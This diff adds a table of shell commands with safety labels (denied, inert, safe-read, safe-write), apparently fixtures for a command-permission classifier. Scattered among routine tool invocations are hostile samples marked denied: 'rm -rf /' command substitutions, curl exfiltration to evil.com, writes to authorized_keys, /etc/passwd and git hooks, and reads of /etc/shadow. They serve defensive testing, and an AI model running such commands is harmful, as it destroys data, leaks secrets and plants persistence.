@@ -1,0 +1,1835 @@
+earthly	denied
+earthly --help	inert
+earthly --help --version	denied
+earthly --help x	denied
+earthly --version	inert
+earthly -h	inert
+earthly -v	inert
+earthly account	denied
+earthly account x	denied
+earthly auth	denied
+earthly auth x	denied
+earthly billing	denied
+earthly billing x	denied
+earthly bootstrap	denied
+earthly bootstrap x	denied
+earthly build	denied
+earthly build x	denied
+earthly completion	denied
+earthly completion --help	inert
+earthly completion --help -h	inert
+earthly completion --help x	inert
+earthly completion -h	inert
+earthly completion x	inert
+earthly config	denied
+earthly config x	denied
+earthly doc	denied
+earthly doc --all-targets	safe-read
+earthly doc --all-targets --help	safe-read
+earthly doc --all-targets x	safe-read
+earthly doc --help	safe-read
+earthly doc -a	safe-read
+earthly doc -h	safe-read
+earthly doc x	safe-read
+earthly docker	denied
+earthly docker x	denied
+earthly docker-build	denied
+earthly docker-build x	denied
+earthly feature	denied
+earthly feature x	denied
+earthly github	denied
+earthly github x	denied
+earthly help	inert
+earthly help x	inert
+earthly init	denied
+earthly init x	denied
+earthly ls	safe-read
+earthly ls --all	safe-read
+earthly ls --all --args	safe-read
+earthly ls --all x	safe-read
+earthly ls --args	safe-read
+earthly ls --help	safe-read
+earthly ls --long	safe-read
+earthly ls -a	safe-read
+earthly ls -h	safe-read
+earthly ls -l	safe-read
+earthly ls x	safe-read
+earthly org	denied
+earthly org x	denied
+earthly preview	denied
+earthly preview x	denied
+earthly prune	denied
+earthly prune x	denied
+earthly registry	denied
+earthly registry x	denied
+earthly satellite	denied
+earthly satellite x	denied
+earthly secret	denied
+earthly secret x	denied
+earthly secrets	denied
+earthly secrets x	denied
+earthly x	denied
+eb	denied
+eb --help	inert
+eb --help --version	denied
+eb --help x	denied
+eb --version	inert
+eb -h	inert
+eb -v	inert
+eb abort	denied
+eb abort x	denied
+eb appversion	denied
+eb appversion x	denied
+eb clone	denied
+eb clone x	denied
+eb codesource	denied
+eb codesource x	denied
+eb completion	denied
+eb completion --help	inert
+eb completion --help -h	inert
+eb completion --help x	inert
+eb completion -h	inert
+eb completion x	inert
+eb config	denied
+eb config x	denied
+eb console	denied
+eb console x	denied
+eb create	denied
+eb create x	denied
+eb deploy	denied
+eb deploy x	denied
+eb events	safe-read
+eb events --follow	safe-read
+eb events --follow --help	safe-read
+eb events --follow --profile x	safe-read
+eb events --follow x	safe-read
+eb events --help	safe-read
+eb events --profile x	safe-read
+eb events --region x	safe-read
+eb events -f	safe-read
+eb events -h	safe-read
+eb events x	safe-read
+eb health	safe-read
+eb health --help	safe-read
+eb health --help --mono	safe-read
+eb health --help --profile x	safe-read
+eb health --help x	safe-read
+eb health --mono	safe-read
+eb health --profile x	safe-read
+eb health --refresh	safe-read
+eb health --region x	safe-read
+eb health --view x	safe-read
+eb health -h	safe-read
+eb health x	safe-read
+eb help	inert
+eb help x	inert
+eb init	denied
+eb init x	denied
+eb labs	denied
+eb labs x	denied
+eb list	safe-read
+eb list --all	safe-read
+eb list --all --help	safe-read
+eb list --all --profile x	safe-read
+eb list --all x	safe-read
+eb list --help	safe-read
+eb list --profile x	safe-read
+eb list --region x	safe-read
+eb list --verbose	safe-read
+eb list -a	safe-read
+eb list -h	safe-read
+eb list -v	safe-read
+eb list x	safe-read
+eb local	denied
+eb local x	denied
+eb logs	safe-read
+eb logs --all	safe-read
+eb logs --all --help	safe-read
+eb logs --all --instance x	safe-read
+eb logs --all x	safe-read
+eb logs --cloudwatch-log-source	denied
+eb logs --cloudwatch-logs	denied
+eb logs --help	safe-read
+eb logs --instance	safe-read
+eb logs --instance x	safe-read
+eb logs --profile x	safe-read
+eb logs --region x	safe-read
+eb logs --stream	safe-read
+eb logs --zip	safe-read
+eb logs -a	safe-read
+eb logs -h	safe-read
+eb logs -z	safe-read
+eb logs x	safe-read
+eb migrate	denied
+eb migrate x	denied
+eb platform	denied
+eb platform x	denied
+eb printenv	safe-read
+eb printenv --help	safe-read
+eb printenv --help --profile x	safe-read
+eb printenv --help -h	safe-read
+eb printenv --help x	safe-read
+eb printenv --profile x	safe-read
+eb printenv --region x	safe-read
+eb printenv -h	safe-read
+eb printenv x	safe-read
+eb repair	denied
+eb repair x	denied
+eb restore	denied
+eb restore x	denied
+eb scale	denied
+eb scale x	denied
+eb setenv	denied
+eb setenv x	denied
+eb ssh	denied
+eb ssh x	denied
+eb status	safe-read
+eb status --help	safe-read
+eb status --help --profile x	safe-read
+eb status --help --verbose	safe-read
+eb status --help x	safe-read
+eb status --profile x	safe-read
+eb status --region x	safe-read
+eb status --verbose	safe-read
+eb status -h	safe-read
+eb status -v	safe-read
+eb status x	safe-read
+eb swap	denied
+eb swap x	denied
+eb tags	denied
+eb tags x	denied
+eb terminate	denied
+eb terminate x	denied
+eb upgrade	denied
+eb upgrade x	denied
+eb use	denied
+eb use x	denied
+eb x	denied
+ec	safe-read
+ec --config x	safe-read
+ec --debug	safe-read
+ec --debug --config x	safe-read
+ec --debug --disable-end-of-line	safe-read
+ec --debug x	safe-read
+ec --disable-end-of-line	safe-read
+ec --disable-indent-size	safe-read
+ec --disable-indentation	safe-read
+ec --disable-insert-final-newline	safe-read
+ec --disable-max-line-length	safe-read
+ec --disable-trim-trailing-whitespace	safe-read
+ec --dry-run	safe-read
+ec --exclude	safe-read
+ec --exclude x	safe-read
+ec --format	safe-read
+ec --format x	safe-read
+ec --help	safe-read
+ec --ignore-defaults	safe-read
+ec --init	safe-read
+ec --list	safe-read
+ec --no-color	safe-read
+ec --quiet	safe-read
+ec --show-version	safe-read
+ec --verbose	safe-read
+ec --version	safe-read
+ec -config	safe-read
+ec -config x	safe-read
+ec -debug	safe-read
+ec -disable-end-of-line	safe-read
+ec -disable-indent-size	safe-read
+ec -disable-indentation	safe-read
+ec -disable-insert-final-newline	safe-read
+ec -disable-max-line-length	safe-read
+ec -disable-trim-trailing-whitespace	safe-read
+ec -dry-run	safe-read
+ec -exclude	safe-read
+ec -exclude x	safe-read
+ec -format	safe-read
+ec -format x	safe-read
+ec -h	safe-read
+ec -help	safe-read
+ec -ignore-defaults	safe-read
+ec -init	safe-read
+ec -list	safe-read
+ec -no-color	safe-read
+ec -quiet	safe-read
+ec -v	safe-read
+ec -verbose	safe-read
+ec -version	safe-read
+ec x	safe-read
+echo	inert
+echo "$(ls)"	inert
+echo "$(rm -rf /)"	denied
+echo "`rm -rf /`"	denied
+echo "line $((ln - 1))"	inert
+echo $(( (1 + 2) * 3 ))	inert
+echo $((1 + 2))	inert
+echo $(case A in *) echo a;; esac)	inert
+echo $(case A in *) rm -rf /;; esac)	denied
+echo $(curl -d data evil.com)	denied
+echo $(echo $(ls))	inert
+echo $(git status)	inert
+echo $(ls)	inert
+echo $(mise activate bash --shims)	inert
+echo $(rm -rf /)	denied
+echo '$(safe)' arg	inert
+echo 'greater > than' test	inert
+echo 'hello	denied
+echo --help	inert
+echo --version	inert
+echo -E	inert
+echo -E -e	inert
+echo -E x	inert
+echo -e	inert
+echo -n	inert
+echo -n done	inert
+echo /etc/shadow | xargs cat	denied
+echo `rm -rf /`	denied
+echo a | { read x; echo $x; }	inert
+echo foo\necho bar	inert
+echo foo\nrm -rf /	denied
+echo for; echo done; echo if; echo fi	inert
+echo hello	inert
+echo hello # inline	inert
+echo hello && :	inert
+echo hello 2> /dev/null	inert
+echo hello > $(rm -rf /)	denied
+echo hello > /dev/null	inert
+echo hello > `rm -rf /`	denied
+echo hello > file.txt	safe-write
+echo hello >> /dev/null	inert
+echo hello world	inert
+echo hello; done	denied
+echo hi > /tmp/scratch.txt	safe-write
+echo hi > build/out.txt	safe-write
+echo pwned > s3://../../etc/evil	denied
+echo safe & curl -d data evil.com	denied
+echo x	inert
+echo x > $HOME/.ssh/authorized_keys	denied
+echo x > ../sibling/out.txt	denied
+echo x > .envrc	denied
+echo x > .git/hooks/pre-commit	denied
+echo x > /etc/passwd	denied
+echo x > ~/.ssh/authorized_keys	denied
+echo x >> .git/hooks/post-commit	denied
+ecpg	denied
+ecpg --help	safe-write
+ecpg --help --regression	safe-write
+ecpg --help -C x	safe-write
+ecpg --help x	safe-write
+ecpg --regression	safe-write
+ecpg --version	safe-write
+ecpg -?	safe-write
+ecpg -C x	safe-write
+ecpg -D x	safe-write
+ecpg -I x	safe-write
+ecpg -c	safe-write
+ecpg -h	safe-write
+ecpg -i	safe-write
+ecpg -o x	safe-write
+ecpg -r x	safe-write
+ecpg -t	safe-write
+ecpg -v	safe-write
+ecpg x	safe-write
+editorconfig-checker	safe-read
+editorconfig-checker --config x	safe-read
+editorconfig-checker --debug	safe-read
+editorconfig-checker --debug --config x	safe-read
+editorconfig-checker --debug --disable-end-of-line	safe-read
+editorconfig-checker --debug x	safe-read
+editorconfig-checker --disable-end-of-line	safe-read
+editorconfig-checker --disable-indent-size	safe-read
+editorconfig-checker --disable-indentation	safe-read
+editorconfig-checker --disable-insert-final-newline	safe-read
+editorconfig-checker --disable-max-line-length	safe-read
+editorconfig-checker --disable-trim-trailing-whitespace	safe-read
+editorconfig-checker --dry-run	safe-read
+editorconfig-checker --exclude	safe-read
+editorconfig-checker --exclude x	safe-read
+editorconfig-checker --format	safe-read
+editorconfig-checker --format x	safe-read
+editorconfig-checker --help	safe-read
+editorconfig-checker --ignore-defaults	safe-read
+editorconfig-checker --init	safe-read
+editorconfig-checker --list	safe-read
+editorconfig-checker --no-color	safe-read
+editorconfig-checker --quiet	safe-read
+editorconfig-checker --show-version	safe-read
+editorconfig-checker --verbose	safe-read
+editorconfig-checker --version	safe-read
+editorconfig-checker -config	safe-read
+editorconfig-checker -config x	safe-read
+editorconfig-checker -debug	safe-read
+editorconfig-checker -disable-end-of-line	safe-read
+editorconfig-checker -disable-indent-size	safe-read
+editorconfig-checker -disable-indentation	safe-read
+editorconfig-checker -disable-insert-final-newline	safe-read
+editorconfig-checker -disable-max-line-length	safe-read
+editorconfig-checker -disable-trim-trailing-whitespace	safe-read
+editorconfig-checker -dry-run	safe-read
+editorconfig-checker -exclude	safe-read
+editorconfig-checker -exclude x	safe-read
+editorconfig-checker -format	safe-read
+editorconfig-checker -format x	safe-read
+editorconfig-checker -h	safe-read
+editorconfig-checker -help	safe-read
+editorconfig-checker -ignore-defaults	safe-read
+editorconfig-checker -init	safe-read
+editorconfig-checker -list	safe-read
+editorconfig-checker -no-color	safe-read
+editorconfig-checker -quiet	safe-read
+editorconfig-checker -v	safe-read
+editorconfig-checker -verbose	safe-read
+editorconfig-checker -version	safe-read
+editorconfig-checker x	safe-read
+egrep	denied
+egrep 'foo|bar' file.txt	safe-read
+egrep --help	denied
+egrep --version	denied
+egrep x	inert
+elan	denied
+elan --help	inert
+elan --help --version	denied
+elan --help x	denied
+elan --version	inert
+elan -V	inert
+elan -h	inert
+elan completions	denied
+elan completions --help	inert
+elan completions --help -h	inert
+elan completions --help x	inert
+elan completions -h	inert
+elan completions x	inert
+elan default	denied
+elan default --help	safe-read
+elan default --help -h	safe-read
+elan default --help x	safe-read
+elan default -h	safe-read
+elan default x	safe-read
+elan help	inert
+elan help x	inert
+elan install	denied
+elan install x	denied
+elan override	inert
+elan override list	inert
+elan override list --help	inert
+elan override list --help -h	inert
+elan override list --help x	inert
+elan override list -h	inert
+elan override list x	inert
+elan override set	denied
+elan override set x	denied
+elan override unset	denied
+elan override unset x	denied
+elan override x	denied
+elan run	denied
+elan run x	denied
+elan self	denied
+elan self x	denied
+elan show	safe-read
+elan show --help	safe-read
+elan show --help -h	safe-read
+elan show --help x	safe-read
+elan show -h	safe-read
+elan show x	safe-read
+elan telemetry	denied
+elan telemetry x	denied
+elan toolchain	inert
+elan toolchain install	denied
+elan toolchain install x	denied
+elan toolchain link	denied
+elan toolchain link x	denied
+elan toolchain list	inert
+elan toolchain list --help	inert
+elan toolchain list --help -h	inert
+elan toolchain list --help x	inert
+elan toolchain list -h	inert
+elan toolchain list x	inert
+elan toolchain uninstall	denied
+elan toolchain uninstall x	denied
+elan toolchain x	denied
+elan uninstall	denied
+elan uninstall x	denied
+elan update	denied
+elan update x	denied
+elan which	denied
+elan which --help	safe-read
+elan which --help -h	safe-read
+elan which --help x	safe-read
+elan which -h	safe-read
+elan which x	safe-read
+elan x	denied
+eleventy	safe-write
+eleventy --config x	safe-write
+eleventy --dryrun	safe-write
+eleventy --dryrun --config x	safe-write
+eleventy --dryrun --formats	safe-write
+eleventy --dryrun x	safe-write
+eleventy --formats	safe-write
+eleventy --help	safe-write
+eleventy --ignore-initial	safe-write
+eleventy --incremental	safe-write
+eleventy --input	safe-write
+eleventy --input x	safe-write
+eleventy --output	safe-write
+eleventy --output x	safe-write
+eleventy --pathprefix x	safe-write
+eleventy --port x	safe-write
+eleventy --quiet	safe-write
+eleventy --running-as-server	safe-write
+eleventy --to	safe-write
+eleventy --to x	safe-write
+eleventy --version	safe-write
+eleventy --what x	safe-write
+eleventy -h	safe-write
+eleventy -q	safe-write
+eleventy x	safe-write
+elixir	denied
+elixir --help	inert
+elixir --help --version	inert
+elixir --help x	denied
+elixir --version	inert
+elixir -h	inert
+elixir -v	inert
+elixir x	denied
+em++	denied
+em++ --help	safe-write
+em++ --help --version	safe-write
+em++ --help x	safe-write
+em++ --version	safe-write
+em++ -?	safe-write
+em++ -h	safe-write
+em++ -v	safe-write
+em++ x	safe-write
+emacs	inert
+emacs --debug-init	inert
+emacs --debug-init --help	inert
+emacs --debug-init x	inert
+emacs --help	inert
+emacs --module-assertions	inert
+emacs --no-build-details	inert
+emacs --no-desktop	inert
+emacs --no-init-file	inert
+emacs --no-site-file	inert
+emacs --no-site-lisp	inert
+emacs --no-splash	inert
+emacs --no-window-system	inert
+emacs --no-x-resources	inert
+emacs --quick	inert
+emacs --version	inert
+emacs -Q	inert
+emacs -h	inert
+emacs -nw	inert
+emacs -q	inert
+emacs x	inert
+emar	denied
+emar --help	safe-write
+emar --help --version	safe-write
+emar --help x	safe-write
+emar --version	safe-write
+emar -h	safe-write
+emar x	safe-write
+emcc	denied
+emcc --help	safe-write
+emcc --help --version	safe-write
+emcc --help x	safe-write
+emcc --version	safe-write
+emcc -?	safe-write
+emcc -h	safe-write
+emcc -v	safe-write
+emcc x	safe-write
+emconfigure	denied
+emconfigure --help	inert
+emconfigure --help --version	inert
+emconfigure --help x	denied
+emconfigure --version	inert
+emconfigure -h	inert
+emconfigure x	denied
+emmake	denied
+emmake --help	inert
+emmake --help --version	inert
+emmake --help x	denied
+emmake --version	inert
+emmake -h	inert
+emmake x	denied
+emranlib	denied
+emranlib --help	inert
+emranlib --help --version	inert
+emranlib --help x	denied
+emranlib --version	inert
+emranlib -h	inert
+emranlib x	denied
+emrun	denied
+emrun --help	inert
+emrun --help --version	inert
+emrun --help x	denied
+emrun --version	inert
+emrun -h	inert
+emrun x	denied
+emstrip	denied
+emstrip --help	inert
+emstrip --help --version	inert
+emstrip --help x	denied
+emstrip --version	inert
+emstrip -h	inert
+emstrip x	denied
+emulator	denied
+emulator --help	inert
+emulator --help --version	inert
+emulator --help x	denied
+emulator --version	inert
+emulator -V	inert
+emulator -h	inert
+emulator -help	inert
+emulator -list-avds	inert
+emulator -version	inert
+emulator x	denied
+enc2xs	denied
+enc2xs --help	denied
+enc2xs --version	denied
+enc2xs -M x	safe-write
+enc2xs -Q	safe-write
+enc2xs -Q -M x	safe-write
+enc2xs -Q -q	safe-write
+enc2xs -Q x	safe-write
+enc2xs -f input.ucm -o out/	safe-write
+enc2xs -f x	safe-write
+enc2xs -o x	safe-write
+enc2xs -q	safe-write
+enc2xs -v	safe-write
+enc2xs x	safe-write
+encguess	denied
+encguess --help	denied
+encguess --version	denied
+encguess -S	inert
+encguess -S -h	inert
+encguess -S -s x	inert
+encguess -S x	inert
+encguess -h	inert
+encguess -s x	inert
+encguess -u	inert
+encguess input.txt	inert
+encguess x	inert
+encode_keychange	denied
+encode_keychange --help	denied
+encode_keychange --version	denied
+encode_keychange -E x	inert
+encode_keychange -N x	inert
+encode_keychange -O x	inert
+encode_keychange -P	inert
+encode_keychange -P -E x	inert
+encode_keychange -P -V	inert
+encode_keychange -P x	inert
+encode_keychange -V	inert
+encode_keychange -f	inert
+encode_keychange -h	inert
+encode_keychange -t x	inert
+encode_keychange -v	inert
+encode_keychange x	inert
+entr	denied
+entr --help	inert
+entr --help --version	inert
+entr --help x	denied
+entr --version	inert
+entr -h	inert
+entr x	denied
+env	inert
+env --help	denied
+env --version	denied
+env --xyzzy FOO=bar cat	denied
+env -i PATH=/usr/bin ls	inert
+env -u FOO git log	inert
+env -x FOO=bar ls	denied
+env FOO=bar	inert
+env FOO=bar BAZ=qux git status	inert
+env FOO=bar bash -c 'git status'	inert
+env FOO=bar ls -la	inert
+env FOO=bar rm -rf /	denied
+env RUST_BACKTRACE=1 cargo test	safe-read
+env bash -c 'ls && rm -rf /'	denied
+env ls -la	inert
+env python3 /tmp/evil.py	denied
+env rm -rf /	denied
+env rm -rf / --help	denied
+env rm -rf / --version	denied
+env sh -c 'rm -rf /'	denied
+env x	denied
+envoy	denied
+envoy --help	inert
+envoy --help --hot-restart-version	inert
+envoy --help x	denied
+envoy --hot-restart-version	inert
+envoy --version	inert
+envoy -?	inert
+envoy -h	inert
+envoy x	denied
+envsubst	inert
+envsubst --help	inert
+envsubst --help --variables	inert
+envsubst --help x	inert
+envsubst --variables	inert
+envsubst --version	inert
+envsubst -V	inert
+envsubst -h	inert
+envsubst -v	inert
+envsubst x	inert
+eps2eps	denied
+eps2eps --help	safe-write
+eps2eps --help -?	safe-write
+eps2eps --help x	safe-write
+eps2eps --version	denied
+eps2eps -?	safe-write
+eps2eps -h	safe-write
+eps2eps in.eps out.eps	safe-write
+eps2eps x	safe-write
+erb_lint	safe-read
+erb_lint --allow-no-files	safe-read
+erb_lint --allow-no-files --autocorrect	safe-write
+erb_lint --allow-no-files --config x	safe-read
+erb_lint --allow-no-files x	safe-read
+erb_lint --autocorrect	safe-write
+erb_lint --clear-cache	safe-read
+erb_lint --color	safe-read
+erb_lint --config x	safe-read
+erb_lint --custom-rule-files x	safe-read
+erb_lint --disable-linters x	safe-read
+erb_lint --enable-all-linters	safe-read
+erb_lint --enable-linters x	safe-read
+erb_lint --exclude x	safe-read
+erb_lint --fail-level	safe-read
+erb_lint --format x	safe-read
+erb_lint --help	safe-read
+erb_lint --lint-all x	safe-read
+erb_lint --no-color	safe-read
+erb_lint --quiet	safe-read
+erb_lint --stats	safe-read
+erb_lint --stdin x	safe-read
+erb_lint --verbose	safe-read
+erb_lint --version	safe-read
+erb_lint -a	safe-write
+erb_lint -c x	safe-read
+erb_lint -f x	safe-read
+erb_lint -h	safe-read
+erb_lint -q	safe-read
+erb_lint x	safe-read
+erblint	safe-read
+erblint --allow-no-files	safe-read
+erblint --allow-no-files --autocorrect	safe-write
+erblint --allow-no-files --config x	safe-read
+erblint --allow-no-files x	safe-read
+erblint --autocorrect	safe-write
+erblint --clear-cache	safe-read
+erblint --color	safe-read
+erblint --config x	safe-read
+erblint --custom-rule-files x	safe-read
+erblint --disable-linters x	safe-read
+erblint --enable-all-linters	safe-read
+erblint --enable-linters x	safe-read
+erblint --exclude x	safe-read
+erblint --fail-level	safe-read
+erblint --format x	safe-read
+erblint --help	safe-read
+erblint --lint-all x	safe-read
+erblint --no-color	safe-read
+erblint --quiet	safe-read
+erblint --stats	safe-read
+erblint --stdin x	safe-read
+erblint --verbose	safe-read
+erblint --version	safe-read
+erblint -a	safe-write
+erblint -c x	safe-read
+erblint -f x	safe-read
+erblint -h	safe-read
+erblint -q	safe-read
+erblint x	safe-read
+erd	denied
+erd --help	inert
+erd --help --version	inert
+erd --help x	denied
+erd --version	inert
+erd -h	inert
+erd -v	inert
+erd x	denied
+erl	denied
+erl --help	inert
+erl --help --version	inert
+erl --help x	denied
+erl --version	inert
+erl -h	inert
+erl x	denied
+errcheck	safe-read
+errcheck --abspath	safe-read
+errcheck --abspath --asserts	safe-read
+errcheck --abspath x	safe-read
+errcheck --asserts	safe-read
+errcheck --blank	safe-read
+errcheck --exclude	safe-read
+errcheck --help	safe-read
+errcheck --ignoregenerated	safe-read
+errcheck --ignoretests	safe-read
+errcheck --mod	safe-read
+errcheck --tags	safe-read
+errcheck --verbose	safe-read
+errcheck --version	denied
+errcheck -abspath	safe-read
+errcheck -asserts	safe-read
+errcheck -blank	safe-read
+errcheck -exclude	safe-read
+errcheck -h	safe-read
+errcheck -ignoregenerated	safe-read
+errcheck -ignoretests	safe-read
+errcheck -mod	safe-read
+errcheck -tags	safe-read
+errcheck -verbose	safe-read
+errcheck x	safe-read
+errno	denied
+errno --help	safe-read
+errno --help --list	safe-read
+errno --help x	safe-read
+errno --list	safe-read
+errno --search	safe-read
+errno --version	denied
+errno -l	safe-read
+errno -s	safe-read
+errno x	safe-read
+esbuild	safe-write
+esbuild --abi-target x	safe-write
+esbuild --alias x	safe-write
+esbuild --allow-overwrite	safe-write
+esbuild --allow-overwrite --abi-target x	safe-write
+esbuild --allow-overwrite --bundle	safe-write
+esbuild --allow-overwrite x	safe-write
+esbuild --analyze x	safe-write
+esbuild --asset-names x	safe-write
+esbuild --banner x	safe-write
+esbuild --bundle	safe-write
+esbuild --charset x	safe-write
+esbuild --chunk-names x	safe-write
+esbuild --color	safe-write
+esbuild --conditions x	safe-write
+esbuild --define x	safe-write
+esbuild --drop x	safe-write
+esbuild --drop-labels x	safe-write
+esbuild --entry-names x	safe-write
+esbuild --external x	safe-write
+esbuild --footer x	safe-write
+esbuild --format x	safe-write
+esbuild --global-name x	safe-write
+esbuild --help	safe-write
+esbuild --ignore-annotations x	safe-write
+esbuild --inject x	safe-write
+esbuild --jsx x	safe-write
+esbuild --jsx-dev x	safe-write
+esbuild --jsx-factory x	safe-write
+esbuild --jsx-fragment x	safe-write
+esbuild --jsx-import-source x	safe-write
+esbuild --jsx-side-effects x	safe-write
+esbuild --keep-names	safe-write
+esbuild --legal-comments x	safe-write
+esbuild --line-limit x	safe-write
+esbuild --loader x	safe-write
+esbuild --log-level x	safe-write
+esbuild --log-limit x	safe-write
+esbuild --log-override x	safe-write
+esbuild --main-fields x	safe-write
+esbuild --mangle-cache x	safe-write
+esbuild --mangle-props x	safe-write
+esbuild --mangle-quoted x	safe-write
+esbuild --metafile	safe-write
+esbuild --minify	safe-write
+esbuild --minify-identifiers	safe-write
+esbuild --minify-syntax	safe-write
+esbuild --minify-whitespace	safe-write
+esbuild --no-color	safe-write
+esbuild --out-extension x	safe-write
+esbuild --outbase x	safe-write
+esbuild --outdir x	safe-write
+esbuild --outfile x	safe-write
+esbuild --packages x	safe-write
+esbuild --platform x	safe-write
+esbuild --preserve-symlinks	safe-write
+esbuild --public-path	safe-write
+esbuild --pure x	safe-write
+esbuild --reserve-props x	safe-write
+esbuild --resolve-extensions x	safe-write
+esbuild --source-root	safe-write
+esbuild --sourcefile	safe-write
+esbuild --sourcemap	safe-write
+esbuild --sources-content	safe-write
+esbuild --splitting	safe-write
+esbuild --supported x	safe-write
+esbuild --target x	safe-write
+esbuild --tree-shaking	safe-write
+esbuild --tsconfig x	safe-write
+esbuild --tsconfig-raw x	safe-write
+esbuild --version	safe-write
+esbuild --write	safe-write
+esbuild -h	safe-write
+esbuild x	safe-write
+eslint	denied
+eslint --cache	safe-read
+eslint --cache --cache-location x	safe-read
+eslint --cache --color	safe-read
+eslint --cache x	safe-read
+eslint --cache-location x	safe-read
+eslint --color	safe-read
+eslint --config x	safe-read
+eslint --debug	safe-read
+eslint --env x	safe-read
+eslint --env-info	safe-read
+eslint --ext x	safe-read
+eslint --format x	safe-read
+eslint --global x	safe-read
+eslint --help	safe-read
+eslint --ignore-path x	safe-read
+eslint --ignore-pattern x	safe-read
+eslint --init	safe-read
+eslint --max-warnings x	safe-read
+eslint --no-color	safe-read
+eslint --no-error-on-unmatched-pattern x	safe-read
+eslint --no-eslintrc	safe-read
+eslint --no-inline-config	safe-read
+eslint --output-file x	safe-read
+eslint --parser x	safe-read
+eslint --parser-options x	safe-read
+eslint --plugin x	safe-read
+eslint --print-config	safe-read
+eslint --quiet	safe-read
+eslint --resolve-plugins-relative-to x	safe-read
+eslint --rule x	safe-read
+eslint --rulesdir x	safe-read
+eslint --version	safe-read
+eslint -c x	safe-read
+eslint -f x	safe-read
+eslint -h	safe-read
+eslint -o x	safe-read
+eslint -v	safe-read
+eslint x	safe-read
+eslogger	denied
+eslogger --format x	inert
+eslogger --help	inert
+eslogger --list-events	inert
+eslogger --list-events --format x	inert
+eslogger --list-events --oslog	inert
+eslogger --list-events x	inert
+eslogger --oslog	inert
+eslogger --oslog-category x	inert
+eslogger --oslog-subsystem x	inert
+eslogger --version	inert
+eslogger x	inert
+espeak-ng	safe-read
+espeak-ng --compile=en	denied
+espeak-ng --help	safe-read
+espeak-ng --help --ipa	safe-read
+espeak-ng --help --path x	safe-read
+espeak-ng --help x	safe-read
+espeak-ng --ipa	safe-read
+espeak-ng --ipa -v en-us hello	safe-read
+espeak-ng --path x	safe-read
+espeak-ng --pho x	safe-read
+espeak-ng --punct x	safe-read
+espeak-ng --sep x	safe-read
+espeak-ng --stdin	safe-read
+espeak-ng --tie x	safe-read
+espeak-ng --version	safe-read
+espeak-ng --voices	safe-read
+espeak-ng -a x	safe-read
+espeak-ng -b x	safe-read
+espeak-ng -f x	safe-read
+espeak-ng -g x	safe-read
+espeak-ng -h	safe-read
+espeak-ng -k x	safe-read
+espeak-ng -l x	safe-read
+espeak-ng -m	safe-read
+espeak-ng -p x	safe-read
+espeak-ng -q	safe-read
+espeak-ng -q --ipa -v en-us -- "-Zephyr"	safe-read
+espeak-ng -s x	safe-read
+espeak-ng -v x	safe-read
+espeak-ng -w out.wav hello	denied
+espeak-ng -x	safe-read
+espeak-ng -z	safe-read
+espeak-ng x	safe-read
+esptool	denied
+esptool --help	inert
+esptool --help --version	denied
+esptool --help x	denied
+esptool --version	inert
+esptool -h	inert
+esptool -v	inert
+esptool chip_id	safe-read
+esptool chip_id --help	safe-read
+esptool chip_id --help -h	safe-read
+esptool chip_id --help x	safe-read
+esptool chip_id -h	safe-read
+esptool chip_id x	safe-read
+esptool dump_mem	denied
+esptool dump_mem x	denied
+esptool elf2image	denied
+esptool elf2image x	denied
+esptool erase_flash	denied
+esptool erase_flash x	denied
+esptool erase_region	denied
+esptool erase_region x	denied
+esptool flash_id	safe-read
+esptool flash_id --help	safe-read
+esptool flash_id --help -h	safe-read
+esptool flash_id --help x	safe-read
+esptool flash_id -h	safe-read
+esptool flash_id x	safe-read
+esptool get_security_info	denied
+esptool get_security_info x	denied
+esptool help	inert
+esptool help x	inert
+esptool image_info	denied
+esptool image_info --help	safe-read
+esptool image_info --help --version x	safe-read
+esptool image_info --help -h	safe-read
+esptool image_info --help x	safe-read
+esptool image_info --version x	safe-read
+esptool image_info -h	safe-read
+esptool image_info -v x	safe-read
+esptool image_info x	safe-read
+esptool load_ram	denied
+esptool load_ram x	denied
+esptool make_image	denied
+esptool make_image x	denied
+esptool merge_bin	denied
+esptool merge_bin x	denied
+esptool read_flash	denied
+esptool read_flash x	denied
+esptool read_flash_status	denied
+esptool read_flash_status x	denied
+esptool read_mac	safe-read
+esptool read_mac --help	safe-read
+esptool read_mac --help -h	safe-read
+esptool read_mac --help x	safe-read
+esptool read_mac -h	safe-read
+esptool read_mac x	safe-read
+esptool read_mem	denied
+esptool read_mem x	denied
+esptool run	denied
+esptool run x	denied
+esptool verify_flash	denied
+esptool verify_flash x	denied
+esptool version	inert
+esptool version --help	inert
+esptool version --help -h	inert
+esptool version --help x	inert
+esptool version -h	inert
+esptool version x	inert
+esptool write_flash	denied
+esptool write_flash x	denied
+esptool write_flash_status	denied
+esptool write_flash_status x	denied
+esptool write_mem	denied
+esptool write_mem x	denied
+esptool x	denied
+esptool.py	denied
+esptool.py --help	inert
+esptool.py --help --version	denied
+esptool.py --help x	denied
+esptool.py --version	inert
+esptool.py -h	inert
+esptool.py -v	inert
+esptool.py chip_id	safe-read
+esptool.py chip_id --help	safe-read
+esptool.py chip_id --help -h	safe-read
+esptool.py chip_id --help x	safe-read
+esptool.py chip_id -h	safe-read
+esptool.py chip_id x	safe-read
+esptool.py dump_mem	denied
+esptool.py dump_mem x	denied
+esptool.py elf2image	denied
+esptool.py elf2image x	denied
+esptool.py erase_flash	denied
+esptool.py erase_flash x	denied
+esptool.py erase_region	denied
+esptool.py erase_region x	denied
+esptool.py flash_id	safe-read
+esptool.py flash_id --help	safe-read
+esptool.py flash_id --help -h	safe-read
+esptool.py flash_id --help x	safe-read
+esptool.py flash_id -h	safe-read
+esptool.py flash_id x	safe-read
+esptool.py get_security_info	denied
+esptool.py get_security_info x	denied
+esptool.py help	inert
+esptool.py help x	inert
+esptool.py image_info	denied
+esptool.py image_info --help	safe-read
+esptool.py image_info --help --version x	safe-read
+esptool.py image_info --help -h	safe-read
+esptool.py image_info --help x	safe-read
+esptool.py image_info --version x	safe-read
+esptool.py image_info -h	safe-read
+esptool.py image_info -v x	safe-read
+esptool.py image_info x	safe-read
+esptool.py load_ram	denied
+esptool.py load_ram x	denied
+esptool.py make_image	denied
+esptool.py make_image x	denied
+esptool.py merge_bin	denied
+esptool.py merge_bin x	denied
+esptool.py read_flash	denied
+esptool.py read_flash x	denied
+esptool.py read_flash_status	denied
+esptool.py read_flash_status x	denied
+esptool.py read_mac	safe-read
+esptool.py read_mac --help	safe-read
+esptool.py read_mac --help -h	safe-read
+esptool.py read_mac --help x	safe-read
+esptool.py read_mac -h	safe-read
+esptool.py read_mac x	safe-read
+esptool.py read_mem	denied
+esptool.py read_mem x	denied
+esptool.py run	denied
+esptool.py run x	denied
+esptool.py verify_flash	denied
+esptool.py verify_flash x	denied
+esptool.py version	inert
+esptool.py version --help	inert
+esptool.py version --help -h	inert
+esptool.py version --help x	inert
